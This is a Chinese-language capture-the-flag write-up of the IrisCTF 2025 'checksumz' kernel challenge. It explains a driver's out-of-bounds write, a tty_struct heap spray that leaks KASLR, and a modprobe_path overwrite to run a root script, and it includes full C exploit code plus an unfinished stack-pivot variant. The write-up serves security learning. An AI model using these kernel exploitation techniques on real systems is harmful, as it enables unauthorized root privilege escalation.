---
title: irisctf checksumz  2025 (modprobe\_path)
---

用2025 irisctf checksumz 来学习modprobe path来任意代码执行

https://github.com/IrisSec/IrisCTF-2025-Challenges/tree/main/checksumz

**[checksumz.tar.gz]**


题目有四个基础功能，都是对一个结构体进行操作

|C++<br>struct checksum\_buffer {<br>`        `loff\_t pos;<br>`        `char state[512];<br>`        `size\_t size;<br>`        `size\_t read;<br>`        `char\* name;<br>`        `uint32\_t s1;<br>`        `uint32\_t s2;<br>};|
| :- |

初始化

|C++<br>buffer->pos = 0;<br>buffer->size = 512;<br>buffer->read = 0;<br>buffer->name = kzalloc(1000, GFP\_KERNEL);<br>buffer->s1 = 1;<br>buffer->s2 = 0;|
| :- |

name在内核堆创造了一个空间为1000的堆块，放在kmalloc-1024

read

|C++<br>static ssize\_t checksumz\_read\_iter(struct kiocb \*iocb, struct iov\_iter \*to) {<br>`        `struct checksum\_buffer\* buffer = iocb->ki\_filp->private\_data;<br>`        `size\_t bytes = iov\_iter\_count(to);<br><br>`        `if (!buffer)<br>`                `return -EBADFD;<br>`        `if (!bytes)<br>`                `return 0;<br>`        `if (buffer->read >= buffer->size) {<br>`                `buffer->read = 0;<br>`                `return 0;<br>`        `}<br><br>`        `ssize\_t copied = copy\_to\_iter(buffer->state + buffer->pos, min(bytes, 256), to);<br><br>`        `buffer->read += copied;<br>`        `buffer->pos += copied;<br>`        `if (buffer->pos >= buffer->size)<br>`                `buffer->pos = buffer->size - 1;<br><br>`        `return copied;<br>}|
| :- |

最多能读256个字节

Ioctl 功能

|C++<br>static long checksumz\_ioctl(struct file \*file, unsigned int command, unsigned long arg) {<br>`        `struct checksum\_buffer\* buffer = file->private\_data;<br><br>`        `if (!file->private\_data)<br>`                `return -EBADFD;<br>        <br>`        `switch (command) {<br>`                `case CHECKSUMZ\_IOCTL\_RESIZE:<br>`                        `if (arg <= buffer->size && arg > 0) {<br>`                                `buffer->size = arg;<br>`                                `buffer->pos = 0;<br>`                        `} else<br>`                                `return -EINVAL;<br><br>`                        `return 0;<br>`                `case CHECKSUMZ\_IOCTL\_RENAME:<br>`                        `char \_\_user \*user\_name\_buf = (char \_\_user\*) arg;<br><br>`                        `if (copy\_from\_user(buffer->name, user\_name\_buf, 48)) {<br>`                                `return -EFAULT;<br>`                        `}<br><br>`                        `return 0;<br>`                `case CHECKSUMZ\_IOCTL\_PROCESS:<br>`                        `adler32(buffer->state, buffer->size, &buffer->s1, &buffer->s2);<br>`                        `memset(buffer->state, 0, buffer->size);<br>`                        `return 0;<br>`                `case CHECKSUMZ\_IOCTL\_DIGEST:<br>`                        `uint32\_t \_\_user \*user\_digest\_buf = (uint32\_t \_\_user\*) arg;<br>`                        `uint32\_t digest = buffer->s1 | (buffer->s2 << 16);<br><br>`                        `if (copy\_to\_user(user\_digest\_buf, &digest, sizeof(uint32\_t))) {<br>`                                `return -EFAULT;<br>`                        `}<br><br>`                        `return 0;<br>`                `default:<br>`                        `return -EINVAL;<br>`        `}<br><br>`        `return 0;<br>}|
| :- |

这里除了rename其他功能对攻击没帮助，有这些只是为了符合题目场景

Write

|C++<br>static ssize\_t checksumz\_write\_iter(struct kiocb \*iocb, struct iov\_iter \*from) {<br>`        `struct checksum\_buffer\* buffer = iocb->ki\_filp->private\_data;<br>`        `size\_t bytes = iov\_iter\_count(from);<br> <br>`        `if (!buffer)<br>`                        `return -EBADFD;<br>`        `if (!bytes)<br>`                        `return 0;<br><br>`                `ssize\_t copied = copy\_from\_iter(buffer->state + buffer->pos, min(bytes, 16), from);<br> <br>`                `buffer->pos += copied;<br>`                `if (buffer->pos >= buffer->size)<br>`                        `buffer->pos = buffer->size - 1;<br>                <br>`        `return copied;<br>}|
| :- |

可以往buf偏移上写最多16字节，这里配合下一个功能可以实现一些奇特的功能

Lseek

|C++<br>static loff\_t checksumz\_llseek(struct file \*file, loff\_t offset, int whence) {<br>`        `struct checksum\_buffer\* buffer = file->private\_data;<br><br>`        `switch (whence) {<br>`                `case SEEK\_SET:<br>`                        `buffer->pos = offset;<br>`                        `break;<br>`                `case SEEK\_CUR:<br>`                        `buffer->pos += offset;<br>`                        `break;<br>`                `case SEEK\_END:<br>`                        `buffer->pos = buffer->size - offset;<br>`                        `break;<br>`                `default:<br>`                        `return -EINVAL;<br>`        `}<br><br>`        `if (buffer->pos < 0)<br>`                `buffer->pos = 0;<br><br>`        `if (buffer->pos >= buffer->size)<br>`                `buffer->pos = buffer->size - 1;<br><br>`        `return buffer->pos;<br>}|
| :- |

可以改pos为任意小于size的值，如果把pos改成512可以溢出15字节。这15字节可以覆盖size到一个很大的值，实现相对任意写。

|C++<br>char\* name;|
| :- |

可见name为指针，不难想到覆盖指针来利用rename来进行任意写

POC

|C++<br>#include "api.h"<br>#include <stdio.h><br>#include <stdlib.h><br>#include <stdint.h><br><br>int fd;<br><br>int main() {<br>`        `fd = open("/dev/checksumz", O\_RDWR);<br>`        `lseek(fd, 512, SEEK\_SET);<br>`        `unsigned long buf[2];<br>`        `memset(buf, 0xff, sizeof(buf));<br>`        `write(fd, buf, sizeof(buf));<br>}|
| :- |

![](Aspose.Words.cb8be341-6b94-47a8-a23b-41df8bba93d4.001.png)

size已经被覆盖成0xffffffffffffffff，这样可以改pos来进行相对任意写和读。

为了能够知道内核地址，我们需要拿到kaslr基地址。可以利用tty\_struct 来创造含有内核地址的堆块

|C++<br>for(int i=0;i<0x100;i++){ spray[i] = open("/dev/ptmx", O\_RDONLY | O\_NOCTTY); }|
| :- |

这样在buf下面会有tty堆块可以读。在泄漏过程中可能会出现泄漏不成功，可以选择多创造点堆块来提升稳定性和在不同位置读堆块来稳定的获得基地址。

![](Aspose.Words.cb8be341-6b94-47a8-a23b-41df8bba93d4.002.png)


最后，把name指针改为modprobe\_path来覆盖为/tmp/x，这样可以在root权限进行任意代码。

modprobe

完整exp

|C++<br>//192.168.64.6:8080/exp<br><br>#include "api.h"<br>#include <stdio.h><br>#include <stdlib.h><br>#include <stdint.h><br>#include <stdio.h><br>#include <sys/types.h><br>#include <sys/stat.h><br>#include <fcntl.h><br>#include <sched.h><br>#include <sys/mman.h><br>#include <signal.h><br>#include <sys/syscall.h><br>#include <sys/ioctl.h><br>#include <linux/userfaultfd.h><br>#include <sys/wait.h><br>#include <poll.h><br>#include <unistd.h><br>#include <stdlib.h><br>#include <string.h><br>#include <pthread.h><br><br>int fd, spray[0x100];<br>unsigned long user\_ss, user\_sp, user\_cs, user\_rflags, kaslr;<br><br>#define modprobe\_path kaslr+0x1b3f100<br><br>void save\_state(){<br>`        `\_\_asm\_\_(<br>`                `".intel\_syntax noprefix;"<br>`                `"mov user\_cs, cs;"<br>`                `"mov user\_ss, ss;"<br>`                `"mov user\_sp, rsp;"<br>`                `"pushf;"<br>`                `"pop user\_rflags;"<br>`                `".att\_syntax;"<br>`           `);<br>}<br><br><br>void shell(){<br>`        `printf("[+] UID %d\n",getuid());<br>`        `system("/bin/sh");<br>}<br><br><br>unsigned long user\_rip = (unsigned long)shell;<br><br>int main() {<br>`        `save\_state();<br>`        `for(int i=0;i<0x80;i++){ spray[i] = open("/dev/ptmx", O\_RDONLY | O\_NOCTTY); }<br>`        `fd = open("/dev/checksumz", O\_RDWR);<br>`        `for(int i=0x80;i<0x100;i++){ spray[i] = open("/dev/ptmx", O\_RDONLY | O\_NOCTTY); }<br>`        `lseek(fd, 512, SEEK\_SET);<br><br>`        `int good;<br>`        `unsigned long buf[2];<br>`        `memset(buf, 0xff, sizeof(buf));<br>`        `write(fd, buf, sizeof(buf));<br>`        `for(int i=0;i<8;i++){<br>`                `lseek(fd, 1048+i\*1024, SEEK\_SET);<br>`                `read(fd, buf, 8);<br>`                `kaslr = buf[0] - 0x1289480;<br>`                `printf("%lx\n", kaslr);<br>`                `printf("%lx\n", (kaslr & ~0xffffff));<br>`                `if((kaslr & ~0xffffff) == kaslr){<br>`                        `printf("kaslr %lx\n", kaslr);<br>`                        `printf("modprobe\_path %lx\n", modprobe\_path);<br>`                        `good = 1;<br>`                        `break;<br>`                `}<br>`        `}<br>`        `//puts("Done");<br>`        `if(!good){<br>`                `puts("[x] exploit failed");<br>`                `exit(0);<br>`        `}<br>`        `lseek(fd, 528, SEEK\_SET);<br>`        `buf[0] = modprobe\_path;<br>`        `write(fd, buf, 8);<br>`        `char \*path = "/tmp/x";<br>`        `ioctl(fd, CHECKSUMZ\_IOCTL\_RENAME, (uint64\_t \*)path);<br><br>`        `system("echo '#!/bin/sh\ncp /dev/vda /tmp/flag\nchmod 777 /tmp/flag' > /tmp/x");<br>`        `system("chmod +x /tmp/x");<br>`        `system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");<br>`        `system("chmod +x /tmp/dummy");<br>`        `system("/tmp/dummy");<br>`        `system("cat /tmp/flag");<br><br>}|
| :- |

可能讲的不好，有建议或者讲错或讲的不对都可以提出来。这解是给预期，预期解如果能做出来可能会再写篇文章。：）

tty\_struct 打法

|C++<br>//192.168.64.6:8080/exp<br><br>#include "api.h"<br>#include <stdio.h><br>#include <stdlib.h><br>#include <stdint.h><br>#include <stdio.h><br>#include <sys/types.h><br>#include <sys/stat.h><br>#include <fcntl.h><br>#include <sched.h><br>#include <sys/mman.h><br>#include <signal.h><br>#include <sys/syscall.h><br>#include <sys/ioctl.h><br>#include <linux/userfaultfd.h><br>#include <sys/wait.h><br>#include <poll.h><br>#include <unistd.h><br>#include <stdlib.h><br>#include <string.h><br>#include <pthread.h><br><br>int fd, spray[0x100];<br>unsigned long user\_ss, user\_sp, user\_cs, user\_rflags, kaslr, name[1];<br><br>//#define modprobe\_path kaslr+0x1b3f100<br>#define pivot kaslr+0x185b884<br><br>void save\_state(){<br>`        `\_\_asm\_\_(<br>`                `".intel\_syntax noprefix;"<br>`                `"mov user\_cs, cs;"<br>`                `"mov user\_ss, ss;"<br>`                `"mov user\_sp, rsp;"<br>`                `"pushf;"<br>`                `"pop user\_rflags;"<br>`                `".att\_syntax;"<br>`           `);<br>}<br><br><br>void shell(){<br>`        `printf("[+] UID %d\n",getuid());<br>`        `system("/bin/sh");<br>}<br><br><br>unsigned long user\_rip = (unsigned long)shell;<br><br>int main() {<br>`        `save\_state();<br>`        `for(int i=0;i<0x80;i++){ spray[i] = open("/dev/ptmx", O\_RDONLY | O\_NOCTTY); }<br>`        `fd = open("/dev/checksumz", O\_RDWR);<br>`        `for(int i=0x80;i<0x100;i++){ spray[i] = open("/dev/ptmx", O\_RDONLY | O\_NOCTTY); }<br><br>`        `lseek(fd, 512, SEEK\_SET);<br><br>`        `int good = 0;<br>`        `unsigned long buf[2];<br>`        `memset(buf, 0xff, sizeof(buf));<br>`        `write(fd, buf, sizeof(buf));<br>`        `for(int i=0;i<8;i++){<br>`                `lseek(fd, 1048+i\*1024, SEEK\_SET);<br>`                `read(fd, buf, 8);<br>`                `kaslr = buf[0] - 0x1289480;<br>`                `printf("%lx\n", buf[0]);<br>`                `if((kaslr & ~0xfffff) == kaslr){<br>`                        `printf("kaslr %lx\n", kaslr);<br>`                        `printf("modprobe\_path %lx\n", pivot);<br>`                        `good = 1;<br>`                        `break;<br>`                `}<br>`        `}<br>`        `//puts("Done");<br>`        `if(!good){<br>`                `puts("[x] exploit failed");<br>`                `exit(0);<br>`        `}<br>`        `lseek(fd, 528, SEEK\_SET);<br>`        `read(fd, buf, 8);<br>`        `name[0] = buf[0];<br>`        `printf("name addr %lx\n", name[0]);<br>`        `lseek(fd, 528, SEEK\_SET);<br><br>`        `unsigned long fake\_ops[4];<br>`        `for(int t=0;t<16;t++){<br>`                `//for(int i=0;i<4;i++){ fake\_ops[i] = 0xffffffffdead0000 + ((i+t\*4) << 8); }<br>`                `for(int i=0;i<4;i++){ fake\_ops[i] = pivot; }<br>`                `ioctl(fd, CHECKSUMZ\_IOCTL\_RENAME, (uint64\_t \*)fake\_ops);<br>`                `name[0] += 32;<br>`                `write(fd, name, 8);<br>`                `lseek(fd, 528, SEEK\_SET);<br>`        `}<br>`        `name[0] -= 512;<br>`        `lseek(fd, 1048, SEEK\_SET);<br>`        `write(fd, name, 8);<br><br>`        `for(int i=0;i<0x100;i++){ ioctl(spray[i], 0x41414141, 0x42424242); }<br><br>`        `/\*<br>`        `buf[0] = modprobe\_path;<br>`        `write(fd, buf, 8);<br>`        `char \*path = "/tmp/x";<br>`        `ioctl(fd, CHECKSUMZ\_IOCTL\_RENAME, (uint64\_t \*)path);<br><br>`        `system("echo '#!/bin/sh\n/bin/sh' > /tmp/sh");<br>`        `system("chmod +x /tmp/sh");<br>`        `system("echo '#!/bin/sh\nmv /tmp/sh /bin/poweroff' > /tmp/x");<br>`        `system("chmod +x /tmp/x");<br>`        `system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");<br>`        `system("chmod +x /tmp/dummy");<br>`        `system("/tmp/dummy");<br>`        `\*/<br>}|
| :- |

没找到合适的gadget来写rop

参考

https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/

